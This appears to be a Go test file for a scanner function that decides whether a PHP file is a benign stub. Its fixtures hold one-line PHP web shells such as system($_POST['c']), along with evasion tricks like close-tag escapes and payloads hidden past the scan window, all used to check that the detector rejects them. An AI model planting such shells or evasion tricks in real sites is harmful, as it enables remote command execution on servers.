func TestIsBenignPHPStubRejectsConditionalDie(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "trick.php")
	if err := os.WriteFile(path, []byte("<?php if (false) die(); system($_GET['c']);"), 0644); err != nil {
		t.Fatal(err)
	}
	if IsBenignPHPStub(path) {
		t.Error("conditional die() that may not run must be rejected -- 'if' is not an accepted token")
	}
}

func TestIsBenignPHPStubRejectsClosingTagEscape(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "escape.php")
	content := "<?php /* harmless */ ?><html><?php system($_POST['c']);"
	if err := os.WriteFile(path, []byte(content), 0644); err != nil {
		t.Fatal(err)
	}
	if IsBenignPHPStub(path) {
		t.Error("?> in pre-terminator region must be rejected -- allows HTML escape and a second <?php block")
	}
}

func TestIsBenignPHPStubRejectsLineCommentCloseTagEscape(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "escape.php")
	content := "<?php // harmless ?><?php system($_POST['c']);"
	if err := os.WriteFile(path, []byte(content), 0644); err != nil {
		t.Fatal(err)
	}
	if IsBenignPHPStub(path) {
		t.Error("PHP line comments end at ?>, so close-tag re-entry must be rejected")
	}
}

func TestIsBenignPHPStubRejectsReturnArray(t *testing.T) {
	// <?php return [...]; evaluates when include()'d. Not a stub.
	dir := t.TempDir()
	path := filepath.Join(dir, "data.php")
	if err := os.WriteFile(path, []byte("<?php return array('key' => 'value');"), 0644); err != nil {
		t.Fatal(err)
	}
	if IsBenignPHPStub(path) {
		t.Error("return statement is not a stub -- file content is evaluated when included from elsewhere")
	}
}

func TestIsBenignPHPStubRejectsMissingOpener(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "no-opener.php")
	if err := os.WriteFile(path, []byte("<html><?php system($_POST['c']); ?>"), 0644); err != nil {
		t.Fatal(err)
	}
	if IsBenignPHPStub(path) {
		t.Error("file not opening with <?php (HTML prefix) must be rejected -- mixed-content files can execute")
	}
}

func TestIsBenignPHPStubRejectsShortEcho(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "echo.php")
	if err := os.WriteFile(path, []byte("<?= $_POST['x'] ?>"), 0644); err != nil {
		t.Fatal(err)
	}
	if IsBenignPHPStub(path) {
		t.Error("<?= short-echo opener must be rejected (emits output from expression)")
	}
}

func TestIsBenignPHPStubRejectsRuntogetherOpener(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "rt.php")
	if err := os.WriteFile(path, []byte("<?phpfoo();"), 0644); err != nil {
		t.Fatal(err)
	}
	if IsBenignPHPStub(path) {
		t.Error("<?phpfoo run-together opener must be rejected -- PHP requires whitespace after <?php")
	}
}

func TestIsBenignPHPStubRejectsUnterminatedBlockComment(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "bad.php")
	if err := os.WriteFile(path, []byte("<?php /* never closes"), 0644); err != nil {
		t.Fatal(err)
	}
	if IsBenignPHPStub(path) {
		t.Error("/* without matching */ in scan window must be rejected -- we cannot prove the rest is comment")
	}
}

func TestIsBenignPHPStubRejectsHeaderCall(t *testing.T) {
	// header() is harmless to PHP execution flow but a stub recogniser
	// that accepts function calls opens the door to header($_POST[...])
	// header injection and to mis-classifying any header(...); echo ...;
	// die(); shape as benign. Keep the gate strictly to comments +
	// terminator; legitimate 404-stub plugins always include die() so
	// they still pass via the terminator branch.
	dir := t.TempDir()
	path := filepath.Join(dir, "hdr.php")
	if err := os.WriteFile(path, []byte("<?php header('Status: 404');"), 0644); err != nil {
		t.Fatal(err)
	}
	if IsBenignPHPStub(path) {
		t.Error("header() call without a terminator must be rejected -- only comments and terminator are accepted statements")
	}
}

func TestIsBenignPHPStubRejectsEmptyFile(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "empty.php")
	if err := os.WriteFile(path, []byte(""), 0644); err != nil {
		t.Fatal(err)
	}
	if IsBenignPHPStub(path) {
		t.Error("empty file is not a PHP stub (no <?php opener)")
	}
}

func TestIsBenignPHPStubRejectsMissingFile(t *testing.T) {
	if IsBenignPHPStub(filepath.Join(t.TempDir(), "does-not-exist.php")) {
		t.Error("missing file must be rejected -- open error => false")
	}
}

func TestIsBenignPHPStubRejectsLargeCommentPrefixWithPayloadAfterScan(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "large.php")
	content := "<?php //" + strings.Repeat("a", benignPHPStubMaxScan) + "\n<?php system($_POST['c']);"
	if err := os.WriteFile(path, []byte(content), 0644); err != nil {
		t.Fatal(err)
	}
	if IsBenignPHPStub(path) {
		t.Error("comment-only acceptance must require EOF; payload after scan window must not be suppressed")
	}
}

func TestIsBenignPHPStubBytesAcceptsBOMAlone(t *testing.T) {
	if !IsBenignPHPStubBytes([]byte("\xEF\xBB\xBF<?php // bom\n")) {
		t.Error("BOM + <?php + comment via buffer entrypoint must be accepted")
	}
}

func TestIsBenignPHPStubBytesRejectsIncompleteCommentOnlyBuffer(t *testing.T) {
	if IsBenignPHPStubBytesComplete([]byte("<?php // comment continues"), false) {
		t.Error("incomplete comment-only buffers must be rejected because executable code may follow")
	}
}

func TestIsBenignPHPStubBytesRejectsEmpty(t *testing.T) {
	if IsBenignPHPStubBytes(nil) {
		t.Error("nil buffer must be rejected")
	}
	if IsBenignPHPStubBytes([]byte{}) {
		t.Error("empty buffer must be rejected")
	}
}
